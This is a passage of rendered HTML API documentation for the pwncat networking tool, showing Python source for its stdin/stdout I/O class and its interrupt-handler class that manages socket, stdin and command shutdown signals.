        <span class="hljs-keyword">if</span> self.__py3:
            sys.stdout.buffer.write(data)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># For issues with flush (when using tail -F or equal) see links below:</span>
            <span class="hljs-comment"># https://stackoverflow.com/questions/26692284</span>
            <span class="hljs-comment"># https://docs.python.org/3/library/signal.html#note-on-sigpipe</span>
            print(data, end=<span class="hljs-string">""</span>)

        <span class="hljs-keyword">try</span>:
            sys.stdout.flush()
        <span class="hljs-keyword">except</span> IOError:
            <span class="hljs-comment"># Python flushes standard streams on exit; redirect remaining output</span>
            <span class="hljs-comment"># to devnull to avoid another broken pipe at shutdown</span>
            devnull = os.open(os.devnull, os.O_WRONLY)
            os.dup2(devnull, sys.stdout.fileno())

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">interrupt</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Stop function that can be called externally to close this instance."""</span>
        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Does not work on windows as it has blocking read of stdin</span>
        self.log.trace(<span class="hljs-string">"STDIN-QUIT signal RAISE in IOStdinStdout.interrupt"</span>)  <span
                                    class="hljs-comment"># type: ignore</span>
        self.ssig.raise_stdin_quit()

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Private Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__set_input_timeout</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Throws a catchable EOFError exception for sys.stdin after timeout (Linux only)."""</span>
        <span class="hljs-comment"># rlist: wait until ready for reading</span>
        <span class="hljs-comment"># wlist: wait until ready for writing</span>
        <span class="hljs-comment"># xlist: wait for an exceptional condition</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> select.select([sys.stdin], [], [], self.__opts.input_timeout)[<span
                                    class="hljs-number">0</span>]:
            <span class="hljs-keyword">raise</span> EOFError(<span
                                    class="hljs-string">"timed out"</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__stdin_israw</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""Check if the terminal (STDIN) is set to raw mode."""</span>
        <span class="hljs-comment"># Non-posix systems (e.g. Windows) do not have a raw mode</span>
        <span class="hljs-keyword">if</span> self.__win:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        fild = sys.stdin.fileno()
        <span class="hljs-keyword">try</span>:
            mode = termios.tcgetattr(fild)
        <span class="hljs-keyword">except</span> termios.error:
            <span class="hljs-comment"># Not a TTY</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># ICANON</span>
        <span class="hljs-comment"># https://linux.die.net/man/3/termios</span>
        <span class="hljs-comment"># The setting of the ICANON canon flag in c_lflag determines whether</span>
        <span class="hljs-comment"># the terminal is operating in canonical mode (ICANON set) or</span>
        <span class="hljs-comment"># noncanonical (raw) mode (ICANON unset). By default, ICANON set.</span>
        <span class="hljs-keyword">return</span> mode[tty.LFLAG] != (mode[tty.LFLAG] | termios.ICANON)  <span
                                    class="hljs-comment"># type: ignore</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__read_stdin</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bytes</span>
        <span class="hljs-string">"""Returns input from STDIN."""</span>
        <span class="hljs-comment"># [1/3] (Windows) Normal/Raw mode</span>
        <span class="hljs-keyword">if</span> self.__win:
            <span class="hljs-keyword">if</span> self.__py3:
                <span class="hljs-keyword">return</span> sys.stdin.buffer.read()
            <span class="hljs-comment"># Python 2 on Windows opens sys.stdin in text mode, and</span>
            <span class="hljs-comment"># binary data that read from it becomes corrupted on \r\n.</span>
            <span class="hljs-comment"># Setting sys.stdin to binary mode fixes that.</span>
            <span class="hljs-keyword">if</span> hasattr(os, <span
                                    class="hljs-string">"O_BINARY"</span>):
                msvcrt.setmode(  <span class="hljs-comment"># type: ignore</span>
                    sys.stdin.fileno(),
                    os.O_BINARY,  <span class="hljs-comment"># pylint: disable=no-member</span>
                )
            <span class="hljs-keyword">return</span> sys.stdin.read()  <span class="hljs-comment"># type: ignore</span>

        <span class="hljs-comment"># [2/3] (Linux/Mac) Raw mode</span>
        <span class="hljs-keyword">if</span> self.__stdin_israw():
            <span class="hljs-comment"># Issue #109</span>
            <span class="hljs-comment"># when pasting in term I donot get full line echo</span>
            <span class="hljs-comment"># To mitigate this, I'm disabling the select.select call on sys.stdin</span>
            <span class="hljs-comment"># self.__set_input_timeout()</span>
            <span class="hljs-keyword">if</span> self.__py3:
                <span class="hljs-keyword">return</span> sys.stdin.buffer.read(<span
                                    class="hljs-number">1</span>)
            <span class="hljs-keyword">return</span> sys.stdin.read(<span
                                    class="hljs-number">1</span>)  <span class="hljs-comment"># type: ignore</span>

        <span class="hljs-comment"># [3/3] (Linux/Mac) Normal mode</span>
        self.__set_input_timeout()
        <span class="hljs-keyword">if</span> self.__py3:
            <span class="hljs-keyword">return</span> sys.stdin.buffer.readline()
        <span class="hljs-keyword">return</span> sys.stdin.readline()  <span class="hljs-comment"># type: ignore</span></code></pre>
                    </details>
                    <h3>Ancestors</h3>
                    <ul class="hlist">
                        <li><a href="https://pwncat.org/pwncat.api.html#pwncat.IO"
                               title="pwncat.IO">IO</a></li>
                        <li>abc.ABC</li>
                    </ul>
                    <h3>Methods</h3>
                    <dl>
                        <dt id="pwncat.IOStdinStdout.consumer"><code class="name flex">
                            <span>def <span
                                    class="ident">consumer</span></span>(<span>self, data)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Print received data to stdout.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">consumer</span>(<span
                                        class="hljs-params">self, data</span>):</span>
    <span class="hljs-comment"># type: (bytes) -&gt; None</span>
    <span class="hljs-string">"""Print received data to stdout."""</span>
    <span class="hljs-keyword">if</span> self.__py3:
        sys.stdout.buffer.write(data)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment"># For issues with flush (when using tail -F or equal) see links below:</span>
        <span class="hljs-comment"># https://stackoverflow.com/questions/26692284</span>
        <span class="hljs-comment"># https://docs.python.org/3/library/signal.html#note-on-sigpipe</span>
        print(data, end=<span class="hljs-string">""</span>)

    <span class="hljs-keyword">try</span>:
        sys.stdout.flush()
    <span class="hljs-keyword">except</span> IOError:
        <span class="hljs-comment"># Python flushes standard streams on exit; redirect remaining output</span>
        <span class="hljs-comment"># to devnull to avoid another broken pipe at shutdown</span>
        devnull = os.open(os.devnull, os.O_WRONLY)
        os.dup2(devnull, sys.stdout.fileno())</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.IOStdinStdout.interrupt"><code class="name flex">
                            <span>def <span class="ident">interrupt</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Stop function that can be called externally to
                                close this instance.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">interrupt</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; None</span>
    <span class="hljs-string">"""Stop function that can be called externally to close this instance."""</span>
    <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Does not work on windows as it has blocking read of stdin</span>
    self.log.trace(<span class="hljs-string">"STDIN-QUIT signal RAISE in IOStdinStdout.interrupt"</span>)  <span
                                            class="hljs-comment"># type: ignore</span>
    self.ssig.raise_stdin_quit()</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.IOStdinStdout.producer"><code class="name flex">
                            <span>def <span class="ident">producer</span></span>(<span>self, *args, **kwargs)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Constantly ask for user input.</p>
                                <h2 id="yields">Yields</h2>
                                <dl>
                                    <dt><code>str</code></dt>
                                    <dd>Data read from stdin.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">producer</span>(<span
                                        class="hljs-params">self, *args, **kwargs</span>):</span>
    <span class="hljs-comment"># type: (Any, Any) -&gt; Iterator[bytes]</span>
    <span class="hljs-string">"""Constantly ask for user input.

    Yields:
        str: Data read from stdin.
    """</span>
    <span class="hljs-comment"># On --send-on-eof we will return all of its contents at once:</span>
    lines = []

    <span class="hljs-comment"># https://stackoverflow.com/questions/1450393/#38670261</span>
    <span class="hljs-comment"># while True: line = sys.stdin.readline() &lt;- reads a whole line (faster)</span>
    <span class="hljs-comment"># for line in sys.stdin.readlin():        &lt;- reads one byte at a time</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        <span class="hljs-keyword">if</span> self.ssig.has_stdin_quit():
            self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                <span class="hljs-string">"STDIN-QUIT signal ACK in IOStdinStdout.producer [1]"</span>
            )
            <span class="hljs-keyword">return</span>
        <span class="hljs-keyword">try</span>:
            data = self.__read_stdin()
        <span class="hljs-keyword">except</span> EOFError:
            <span class="hljs-comment"># When using select() with timeout, we don't have any input</span>
            <span class="hljs-comment"># at this point and simply continue the loop or quit if</span>
            <span class="hljs-comment"># a terminate request has been made by other threads.</span>
            <span class="hljs-keyword">if</span> self.ssig.has_stdin_quit():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"STDIN-QUIT signal ACK in IOStdinStdout.producer [2]"</span>
                )
                <span class="hljs-keyword">return</span>
            <span class="hljs-keyword">continue</span>
        <span class="hljs-keyword">if</span> data:
            self.log.debug(<span class="hljs-string">"Received %d bytes from STDIN"</span>, len(data))
            self.log.trace(<span class="hljs-string">"Received: %s"</span>, repr(data))  <span
                                            class="hljs-comment"># type: ignore</span>
            <span class="hljs-comment"># [send-on-eof] Append data</span>
            <span class="hljs-keyword">if</span> self.__opts.send_on_eof:
                lines.append(data)
            <span class="hljs-keyword">else</span>:
                <span class="hljs-keyword">yield</span> data
        <span class="hljs-comment"># EOF or &lt;Ctrl&gt;+&lt;d&gt;</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># [send-on-eof] Dump data before quitting</span>
            <span class="hljs-keyword">if</span> lines <span class="hljs-keyword">and</span> self.__opts.send_on_eof:
                <span class="hljs-keyword">yield</span> StringEncoder.encode(<span
                                            class="hljs-string">""</span>).join(lines)
            self.log.trace(<span class="hljs-string">"STDIN-EOF signal RAISE in IOStdinStdout.producer"</span>)  <span
                                            class="hljs-comment"># type: ignore</span>
            self.ssig.raise_stdin_eof()</code></pre>
                            </details>
                        </dd>
                    </dl>
                    <h3>Inherited members</h3>
                    <ul class="hlist">
                        <li><code><b><a href="https://pwncat.org/pwncat.api.html#pwncat.IO"
                                        title="pwncat.IO">IO</a></b></code>:
                            <ul class="hlist">
                                <li><code><a href="https://pwncat.org/pwncat.api.html#pwncat.IO.log"
                                             title="pwncat.IO.log">log</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.IO.ssig"
                                        title="pwncat.IO.ssig">ssig</a></code>
                                </li>
                            </ul>
                        </li>
                    </ul>
                </dd>
                <dt id="pwncat.InterruptHandler"><code class="flex name class">
                    <span>class <span class="ident">InterruptHandler</span></span>
                    <span>(</span><span>keep_open, no_shutdown)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Pwncat interrupt handler.</p>
                        <p>It allows all threads to raise various signal on certain actions,
                            as well as to ask the Interrupt Handler what to do.
                            The Interrupt handler will internally decide (based on pwncat's
                            command line arguments) what to do.</p>
                        <p>Instantiate InterruptHandler.</p>
                        <h2 id="args">Args</h2>
                        <dl>
                            <dt><strong><code>keep_open</code></strong> :<code>bool</code></dt>
                            <dd><code>--keep-open</code> command line argument.</dd>
                            <dt><strong><code>no_shutdown</code></strong> :<code>bool</code></dt>
                            <dd><code>--no-shutdown</code> command line argument.</dd>
                        </dl>
                    </div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">InterruptHandler</span>(<span
                                class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""Pwncat interrupt handler.

    It allows all threads to raise various signal on certain actions,
    as well as to ask the Interrupt Handler what to do.
    The Interrupt handler will internally decide (based on pwncat's
    command line arguments) what to do.
    """</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, keep_open, no_shutdown</span>):</span>
        <span class="hljs-comment"># type: (bool, bool) -&gt; None</span>
        <span class="hljs-string">"""Instantiate InterruptHandler.

        Args:
            keep_open (bool): `--keep-open` command line argument.
            no_shutdown (bool): `--no-shutdown` command line argument.
        """</span>
        self.__log = logging.getLogger(__name__)  <span
                                    class="hljs-comment"># type: logging.Logger</span>
        self.__keep_open = keep_open
        self.__no_shutdown = no_shutdown

        <span class="hljs-comment"># Shutdown signals</span>
        self.__terminate = <span class="hljs-literal">False</span>
        self.__sock_send_eof = <span class="hljs-literal">False</span>
        self.__sock_quit = <span class="hljs-literal">False</span>
        self.__stdin_quit = <span class="hljs-literal">False</span>
        self.__command_quit = <span class="hljs-literal">False</span>

        <span class="hljs-comment"># Producers have received EOF</span>
        self.__sock_eof = <span class="hljs-literal">False</span>
        self.__stdin_eof = <span class="hljs-literal">False</span>
        self.__command_eof = <span class="hljs-literal">False</span>

        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">handler</span>(<span
                class="hljs-params">signum, frame</span>):</span>  <span class="hljs-comment"># type: ignore  # pylint: disable=unused-argument</span>
            self.__log.trace(<span class="hljs-string">"Ctrl+c caught."</span>)  <span
                                    class="hljs-comment"># type: ignore</span>
            <span class="hljs-comment"># logging.shutdown()</span>
            self.raise_terminate()

        <span class="hljs-comment"># Handle Ctrl+C</span>
        <span class="hljs-comment"># signal.signal(signal.SIGTERM, handler)</span>
        signal.signal(signal.SIGINT, handler)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Ask for action</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">has_terminate</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Switch to be checked if pwncat should be terminated."""</span>
        <span class="hljs-keyword">return</span> self.__terminate

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">has_sock_send_eof</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Switch to be checked if the socket connection should be closed for sending."""</span>
        <span class="hljs-keyword">return</span> self.__sock_send_eof

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">has_sock_quit</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Switch to be checked if the socket connection should be closed."""</span>
        <span class="hljs-keyword">return</span> self.__sock_quit

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">has_stdin_quit</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Switch to be checked if the STDIN should be closed."""</span>
        <span class="hljs-keyword">return</span> self.__stdin_quit

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">has_command_quit</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Switch to be checked if the command should be closed."""</span>
        <span class="hljs-keyword">return</span> self.__command_quit

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Raise Termination signal</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">raise_terminate</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Signal the application that Socket should be quit."""</span>
        self.__log.trace(<span class="hljs-string">"SIGNAL TERMINATE raised"</span>)  <span
                                    class="hljs-comment"># type: ignore</span>
        self.__terminate = <span class="hljs-literal">True</span>
        self.__sock_quit = <span class="hljs-literal">True</span>
        self.__stdin_quit = <span class="hljs-literal">True</span>
        self.__command_quit = <span class="hljs-literal">True</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Raise Socket signals</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">raise_sock_send_eof</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Signal the application that Socket should be closed for sending."""</span>
        <span class="hljs-comment"># self.__log.trace("SIGNAL SOCK-CLOSE-SEND raised")  # type: ignore</span>
        self.__sock_send_eof = <span class="hljs-literal">True</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">raise_sock_eof</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Signal the application that Socket has received EOF."""</span>
        <span class="hljs-comment"># self.__log.trace("SIGNAL SOCK-EOF raised")  # type: ignore</span>
        self.__sock_eof = <span class="hljs-literal">True</span>
        self.raise_sock_quit()

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">raise_sock_quit</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Signal the application that Socket should be quit."""</span>
        <span class="hljs-comment"># self.__log.trace("SIGNAL SOCK-QUIT raised")  # type: ignore</span>
        self.__sock_quit = <span class="hljs-literal">True</span>
        self.raise_terminate()

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Raise STDIN signals</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">raise_stdin_eof</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Signal the application that STDIN has received EOF."""</span>
        <span class="hljs-comment"># self.__log.trace("SIGNAL STDIN-EOF raised")  # type: ignore</span>
        self.__stdin_eof = <span class="hljs-literal">True</span>
        self.raise_stdin_quit()

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">raise_stdin_quit</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Signal the application that STDIN should be quit."""</span>
        <span class="hljs-comment"># self.__log.trace("SIGNAL STDIN-QUIT raised")  # type: ignore</span>
        self.__stdin_quit = <span class="hljs-literal">True</span>
        <span class="hljs-comment"># If --no-shutdown or -keep-open is specified</span>
        <span class="hljs-comment"># pwncat will not invoke shutdown on a socket after seeing EOF on stdin</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (self.__no_shutdown <span
                                    class="hljs-keyword">or</span> self.__keep_open):
            <span class="hljs-comment"># No more data from stdin, we can tell the remote side we are done</span>
            <span class="hljs-comment"># by closing the socket for sending (they will receive an EOF).</span>
            self.raise_sock_send_eof()

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Raise COMMAND signals</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">raise_command_eof</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Signal the application that Command has received EOF."""</span>
        <span class="hljs-comment"># self.__log.trace("SIGNAL COMMAND-EOF raised")  # type: ignore</span>
        self.__command_eof = <span class="hljs-literal">True</span>
        self.raise_command_quit()

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">raise_command_quit</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Signal the application that Command should be quit."""</span>
        <span class="hljs-comment"># self.__log.trace("SIGNAL COMMAND-QUIT raised")  # type: ignore</span>
        self.__command_quit = <span class="hljs-literal">True</span>
        self.raise_terminate()</code></pre>
                    </details>
                    <h3>Methods</h3>
                    <dl>
                        <dt id="pwncat.InterruptHandler.has_command_quit"><code class="name flex">
                            <span>def <span
                                    class="ident">has_command_quit</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p><code>bool</code>: Switch to be checked if the
                                command should be closed.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">has_command_quit</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; bool</span>
    <span class="hljs-string">"""`bool`: Switch to be checked if the command should be closed."""</span>
    <span class="hljs-keyword">return</span> self.__command_quit</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.InterruptHandler.has_sock_quit"><code class="name flex">
                            <span>def <span
                                    class="ident">has_sock_quit</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p><code>bool</code>: Switch to be checked if the
                                socket connection should be closed.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">has_sock_quit</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; bool</span>
    <span class="hljs-string">"""`bool`: Switch to be checked if the socket connection should be closed."""</span>
    <span class="hljs-keyword">return</span> self.__sock_quit</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.InterruptHandler.has_sock_send_eof"><code class="name flex">
                            <span>def <span class="ident">has_sock_send_eof</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p><code>bool</code>: Switch to be checked if the
                                socket connection should be closed for sending.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">has_sock_send_eof</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; bool</span>
    <span class="hljs-string">"""`bool`: Switch to be checked if the socket connection should be closed for sending."""</span>
    <span class="hljs-keyword">return</span> self.__sock_send_eof</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.InterruptHandler.has_stdin_quit"><code class="name flex">
                            <span>def <span
                                    class="ident">has_stdin_quit</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p><code>bool</code>: Switch to be checked if the
                                STDIN should be closed.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">has_stdin_quit</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; bool</span>
    <span class="hljs-string">"""`bool`: Switch to be checked if the STDIN should be closed."""</span>
    <span class="hljs-keyword">return</span> self.__stdin_quit</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.InterruptHandler.has_terminate"><code class="name flex">
                            <span>def <span
                                    class="ident">has_terminate</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p><code>bool</code>: Switch to be checked if pwncat
                                should be terminated.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">has_terminate</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; bool</span>
    <span class="hljs-string">"""`bool`: Switch to be checked if pwncat should be terminated."""</span>
    <span class="hljs-keyword">return</span> self.__terminate</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.InterruptHandler.raise_command_eof"><code class="name flex">
                            <span>def <span class="ident">raise_command_eof</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Signal the application that Command has received
                                EOF.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">raise_command_eof</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; None</span>
    <span class="hljs-string">"""Signal the application that Command has received EOF."""</span>
    <span class="hljs-comment"># self.__log.trace("SIGNAL COMMAND-EOF raised")  # type: ignore</span>
    self.__command_eof = <span class="hljs-literal">True</span>
    self.raise_command_quit()</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.InterruptHandler.raise_command_quit"><code class="name flex">
                            <span>def <span class="ident">raise_command_quit</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Signal the application that Command should be
                                quit.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">raise_command_quit</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; None</span>
    <span class="hljs-string">"""Signal the application that Command should be quit."""</span>
    <span class="hljs-comment"># self.__log.trace("SIGNAL COMMAND-QUIT raised")  # type: ignore</span>
    self.__command_quit = <span class="hljs-literal">True</span>
    self.raise_terminate()</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.InterruptHandler.raise_sock_eof"><code class="name flex">
                            <span>def <span
                                    class="ident">raise_sock_eof</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Signal the application that Socket has received
                                EOF.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">raise_sock_eof</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; None</span>
    <span class="hljs-string">"""Signal the application that Socket has received EOF."""</span>
    <span class="hljs-comment"># self.__log.trace("SIGNAL SOCK-EOF raised")  # type: ignore</span>
    self.__sock_eof = <span class="hljs-literal">True</span>
    self.raise_sock_quit()</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.InterruptHandler.raise_sock_quit"><code class="name flex">
                            <span>def <span
                                    class="ident">raise_sock_quit</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Signal the application that Socket should be
                                quit.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">raise_sock_quit</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; None</span>
    <span class="hljs-string">"""Signal the application that Socket should be quit."""</span>
    <span class="hljs-comment"># self.__log.trace("SIGNAL SOCK-QUIT raised")  # type: ignore</span>
    self.__sock_quit = <span class="hljs-literal">True</span>
    self.raise_terminate()</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.InterruptHandler.raise_sock_send_eof"><code
                                class="name flex">
                            <span>def <span class="ident">raise_sock_send_eof</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Signal the application that Socket should be closed
                                for sending.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">raise_sock_send_eof</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; None</span>
    <span class="hljs-string">"""Signal the application that Socket should be closed for sending."""</span>
    <span class="hljs-comment"># self.__log.trace("SIGNAL SOCK-CLOSE-SEND raised")  # type: ignore</span>
    self.__sock_send_eof = <span class="hljs-literal">True</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.InterruptHandler.raise_stdin_eof"><code class="name flex">
                            <span>def <span
                                    class="ident">raise_stdin_eof</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Signal the application that STDIN has received
                                EOF.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">raise_stdin_eof</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; None</span>
